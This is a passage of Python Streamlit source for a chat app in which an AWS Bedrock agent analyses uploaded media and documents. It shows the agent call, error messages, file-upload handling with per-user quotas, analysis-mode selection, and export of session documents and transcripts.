                        "Do NOT use detect_labels, detect_faces, or transcribe_audio — those tools are DISABLED in BDA mode. "
                        "If a BDA tool fails with an error, report the error to the user. Do NOT fall back to Rekognition or Transcribe.]"
                    )

                full_prompt = "\n\n".join(prompt_parts)

                try:
                    result = agent(full_prompt)

                    # Extract the markdown text from the agent response
                    response_text = ""
                    if hasattr(result, "message"):
                        msg = result.message
                        # Handle dict-style message with content list
                        if isinstance(msg, dict) and "content" in msg:
                            for block in msg["content"]:
                                if isinstance(block, dict) and "text" in block:
                                    response_text += block["text"]
                                elif isinstance(block, str):
                                    response_text += block
                        elif isinstance(msg, str):
                            response_text = msg
                        else:
                            response_text = str(msg)
                    else:
                        response_text = str(result)
                except Exception as e:
                    error_msg = str(e)
                    if "ResourceNotFoundException" in error_msg or "Access denied" in error_msg or "Legacy" in error_msg:
                        response_text = (
                            f"❌ **Model error:** The selected model (`{config.MODEL_ID}`) is not accessible.\n\n"
                            f"This may mean the model is not enabled in your Bedrock console, "
                            f"or it has been deprecated.\n\n"
                            f"**To fix:** Set `MODEL_ID` to an accessible Bedrock model and restart the agent. "
                            f"For ECS, update the `ModelId` CloudFormation parameter and redeploy."
                        )
                    elif "ExpiredTokenException" in error_msg or "credentials" in error_msg.lower():
                        response_text = (
                            f"❌ **Authentication error:** Your AWS credentials have expired.\n\n"
                            f"**To fix:** Run `aws sso login --profile <your-profile>` or "
                            f"update credentials in your `.env` file, then restart the agent."
                        )
                    else:
                        response_text = (
                            f"❌ **Error:** Something went wrong while processing your request.\n\n"
                            f"Details: {error_msg[:500]}\n\n"
                            f"Please try again. If the issue persists, check your AWS credentials and model access."
                        )

                # T-11: no unsafe_allow_html — this is model output, and model
                # output is shaped by attacker-influenceable uploaded content.
                # See the chat-history render above for the full rationale.
                st.markdown(response_text)

                # Record this exchange in the session document
                session_doc_ref: SessionDocument = st.session_state.session_doc
                session_doc_ref.add_entry(prompt, response_text)

                # Show save prompt. This string is app-authored
                # (SessionDocument.get_save_prompt), not model output, so HTML
                # here is not part of the T-11 injection path.
                save_prompt_text = session_doc_ref.get_save_prompt()
                st.markdown(save_prompt_text, unsafe_allow_html=True)

        st.session_state.messages.append({"role": "assistant", "content": response_text})

        # Force a clean rerun so sidebar picks up the latest state
        # (bg_processing_started was reset to False during agent execution)
        st.rerun()

# ── Sidebar ────────────────────────────────────────────────────────────────
with st.sidebar:
    # User info and logout
    st.markdown(f"👤 **{get_user_email()}**")
    if st.button("🚪 Logout", key="logout_btn"):
        logout()

    st.markdown("---")

    # ── Upload status indicator (only when this session triggered an upload) ──
    # Gated on st.session_state["bg_processing_started"] to avoid showing stale
    # global status (e.g., another user's "done" state, or a previous session's result).
    if st.session_state.get("bg_processing_started"):
        try:
            from background_processor import get_status as _sb_status
            _sb = _sb_status()
            _sb_upload = _sb.get("upload_status", "idle")
            if _sb_upload == "running":
                st.warning("⏳ **Uploading file to S3...**\n\nPlease wait before submitting your request.")
            elif _sb_upload == "done":
                st.success("✅ **S3 uploaded** — ready for analysis")
            elif _sb_upload == "error":
                st.error(f"❌ **S3 upload failed:** {_sb.get('upload_error', 'unknown error')}")
            # If 'idle', show nothing (no upload happening)
        except Exception:
            pass
    st.header("How to use")
    st.markdown("""
    1. **Upload a video** or **audio file** in the chat
    2. Upload **images/diagrams** (up to 10) for reference or analysis
    3. Ask what you want to find: objects, faces, scenes, lyrics
    4. Ask follow-up questions — results are cached

    **Example prompts:**
    - "Analyze this video and tell me what's in it"
    - "Find all the cars in the video"
    - "Are there any faces? What emotions?"
    - "Analyze all the uploaded diagrams and summarize them"
    - "Find the person from the first image in the video"
    - "Transcribe this video and summarize the meeting"
    """)

    st.markdown("---")

    # Analysis mode toggle
    st.header("⚙️ Analysis Mode")
    analysis_mode = st.radio(
        "Choose video/audio analysis engine:",
        ["Bedrock Data Automation (BDA)", "Traditional (Rekognition + Transcribe)"],
        index=0,
        key="analysis_mode_v2",
        help="BDA: single API for summary + transcript + chapters (recommended). Traditional: separate Rekognition + Transcribe calls (may be blocked by SCPs in some environments).",
    )
    st.session_state["use_bda"] = "BDA" in analysis_mode

    st.markdown("---")

    # General file upload — accepts all supported types
    st.header("📁 Upload Files")
    st.markdown("Upload videos, images, documents, or spreadsheets.")
    uploaded_files = st.file_uploader(
        "Upload files",
        type=None,  # Accept any file type
        accept_multiple_files=True,
        key="general_upload",
    )
    if uploaded_files:
        # T-07: stage inside the per-user directory so the quota below has a
        # single path to measure. A mkdtemp subdirectory per batch keeps
        # repeated filenames from colliding.
        tmp_dir = tempfile.mkdtemp(dir=_user_tmp_dir)
        for uf in uploaded_files:
            # Enforce the per-user quota BEFORE writing anything to disk.
            allowed, reason = _quota_check(uf.size)
            if not allowed:
                st.error(f"🚫 {uf.name}: {reason}")
                continue

            fpath = os.path.join(tmp_dir, uf.name)
            with open(fpath, "wb") as f:
                f.write(uf.getbuffer())
            size_mb = uf.size / (1024 * 1024)
            ext = os.path.splitext(uf.name)[1].lower()

            # Categorize by file type
            if ext in (".mp4", ".mov", ".avi", ".mkv", ".webm"):
                st.session_state["uploaded_video_path"] = fpath
                st.success(f"🎥 Video: {uf.name} ({size_mb:.1f} MB)")
                # Only run background Rekognition + Transcribe in Traditional mode
                if not st.session_state.get("use_bda"):
                    if not st.session_state.get("bg_processing_started"):
                        # Capture user_prefix in Streamlit context, pass to background thread
                        from config import get_user_prefix
                        user_prefix = get_user_prefix()
                        start_background_processing(fpath, user_prefix=user_prefix)
                        st.session_state["bg_processing_started"] = True
                        st.info("⚡ Background analysis started — uploading and processing in parallel.")
                else:
                    # BDA mode: upload to S3 synchronously with a spinner
                    # (ECS→S3 same-region is fast enough; avoids session-state race)
                    if not st.session_state.get("bg_processing_started"):
                        from background_processor import _upload_to_s3
                        from config import get_user_prefix
                        user_prefix = get_user_prefix()
                        with st.spinner("⏳ Uploading to S3..."):
                            _upload_to_s3(fpath, user_prefix=user_prefix)
                        st.session_state["bg_processing_started"] = True
                        st.success("✅ Uploaded to S3 — ready for BDA analysis. Ask me to analyze your video.")
            elif ext in (".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff"):
                image_paths = st.session_state.setdefault("ref_image_paths", [])
                if len(image_paths) >= 10:
                    st.warning(f"⚠️ Image limit reached (10 max). Skipping {uf.name}")
                else:
                    image_paths.append(fpath)
                    st.image(uf, caption=uf.name, use_container_width=True)
                    st.success(f"📷 Image {len(image_paths)}/10: {uf.name}")
            elif ext == ".svg":
                st.session_state.setdefault("uploaded_documents", []).append(fpath)
                st.success(f"🎨 SVG: {uf.name} ({size_mb:.1f} MB)")
            elif ext == ".pdf":
                st.session_state.setdefault("uploaded_documents", []).append(fpath)
                st.success(f"📄 PDF: {uf.name} ({size_mb:.1f} MB)")
            elif ext in (".docx", ".doc"):
                st.session_state.setdefault("uploaded_documents", []).append(fpath)
                st.success(f"📝 Word: {uf.name} ({size_mb:.1f} MB)")
            elif ext in (".xlsx", ".xls", ".csv"):
                st.session_state.setdefault("uploaded_documents", []).append(fpath)
                st.success(f"📊 Spreadsheet: {uf.name} ({size_mb:.1f} MB)")
            else:
                st.session_state.setdefault("uploaded_documents", []).append(fpath)
                st.success(f"📎 File: {uf.name} ({size_mb:.1f} MB)")

    st.markdown("---")

    # ── Background Processing Status ─────────────────────────────────
    if st.session_state.get("bg_processing_started"):
        bg = get_bg_status()
        status_icons = {"idle": "⏳", "running": "🔄", "done": "✅", "error": "❌"}
        st.markdown("---")
        st.header("⚡ Background Processing")
        st.markdown(
            f"- S3 Upload: {status_icons.get(bg['upload_status'], '?')} {bg['upload_status']}\n"
            f"- Label Detection: {status_icons.get(bg['labels_status'], '?')} {bg['labels_status']}\n"
            f"- Transcription: {status_icons.get(bg['transcribe_status'], '?')} {bg['transcribe_status']}"
        )
        if any(bg[k] == "error" for k in ["upload_status", "labels_status", "transcribe_status"]):
            errors = [bg[k] for k in ["upload_error", "labels_error", "transcribe_error"] if bg[k]]
            if errors:
                # Friendly summarization for common error patterns
                friendly_msgs = []
                for err in errors:
                    err_str = str(err)
                    if "service control policy" in err_str.lower() or "explicit deny" in err_str.lower():
                        # SCP block — common in restricted accounts. Suggest BDA mode.
                        friendly_msgs.append(
                            "⚠️ Traditional analysis (Rekognition/Transcribe) is blocked by your AWS organization policy. "
                            "Switch to **Bedrock Data Automation (BDA)** mode in the Analysis Mode section above to use a permitted path."
                        )
                        break  # one friendly message is enough
                    elif "AccessDeniedException" in err_str:
                        friendly_msgs.append("⚠️ Access denied. Check that the ECS task role has the required permissions.")
                    else:
                        # Truncate long error strings (typically AWS ARNs)
                        truncated = err_str if len(err_str) < 200 else err_str[:200] + "..."
                        friendly_msgs.append(f"❌ {truncated}")
                for msg in friendly_msgs:
                    st.warning(msg)
        if all(bg[k] in ("done", "error") for k in ["upload_status", "labels_status", "transcribe_status"]):
            st.success("Background processing complete — results cached and ready.")

    # ── Session Document Export ────────────────────────────────────────
    st.header("📄 Session Document")
    session_doc: SessionDocument = st.session_state.session_doc

    if session_doc.total_entries > 0:
        st.markdown(
            f"**{session_doc.total_entries}** response(s) recorded  \n"
            f"**{session_doc.total_entries - session_doc.unsaved_count}** saved to document"
        )

        col1, col2 = st.columns(2)
        with col1:
            if st.button("💾 Save latest"):
                session_doc.save_current()
                st.toast("Latest response saved to document")
                st.rerun()
        with col2:
            if st.button("💾 Save all"):
                session_doc.save_all()
                st.toast(f"All {session_doc.total_entries} responses saved")
                st.rerun()

        # Save last N
        if session_doc.total_entries > 1:
            n = st.number_input(
                "Save last N responses",
                min_value=1,
                max_value=session_doc.total_entries,
                value=min(3, session_doc.total_entries),
                key="save_last_n",
            )
            if st.button(f"💾 Save last {n}"):
                session_doc.save_last_n(n)
                st.toast(f"Last {n} responses saved")
                st.rerun()

        # Download button (always available if anything is saved)
        if session_doc.total_entries - session_doc.unsaved_count > 0:
            docx_buffer = session_doc.generate_docx()
            st.download_button(
                label="📥 Download Word Document",
                data=docx_buffer,
                file_name=f"analysis_session_{_time.strftime('%Y%m%d_%H%M%S')}.docx",
                mime="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            )
    else:
        st.caption("No analysis responses yet. Start a conversation to build your session document.")

    # ── Transcript Download ───────────────────────────────────────────
    transcript_text = get_detection_cache().get("transcript_text")
    if transcript_text:
        st.markdown("---")
        st.header("📝 Transcript")
        lang = get_detection_cache().get("transcript_language", "unknown")
        st.markdown(f"Language: **{lang}** | Length: {len(transcript_text):,} chars")
        transcript_segments = get_detection_cache().get("transcript_segments", [])
        if transcript_segments and len("\n".join(transcript_segments)) > len(transcript_text) * 0.5:
            # Use segments only if they contain substantial content (not truncated)
            download_text = f"Language: {lang}\n\n" + "\n".join(transcript_segments)
        else:
            # Use full transcript text (segments may be truncated summaries)
            download_text = f"Language: {lang}\n\n{transcript_text}"
        st.download_button(
            label="📥 Download Transcript (.txt)",
            data=download_text,
            file_name=f"transcript_{lang}.txt",
            mime="text/plain",
        )

    st.markdown("---")
    if st.button("🗑️ Clear chat & clean up files"):
        # Offer final download if there are unsaved entries
        if session_doc.has_unsaved() and session_doc.total_entries > 0:
            session_doc.save_all()
            st.toast("All responses auto-saved before cleanup")

        deleted_local, deleted_s3 = _cleanup_session_files()
        st.session_state.messages = []
        st.session_state.pop("uploaded_video_path", None)
        st.session_state.pop("ref_image_paths", None)
        st.session_state.pop("uploaded_documents", None)
        st.session_state.pop("processed_files", None)
        st.session_state.pop("bg_processing_started", None)
        st.session_state.session_doc = SessionDocument()
        get_detection_cache().clear()
        if deleted_local or deleted_s3:
            st.toast(f"Cleaned up {len(deleted_local)} local file(s) and {len(deleted_s3)} S3 object(s)")
        st.rerun()
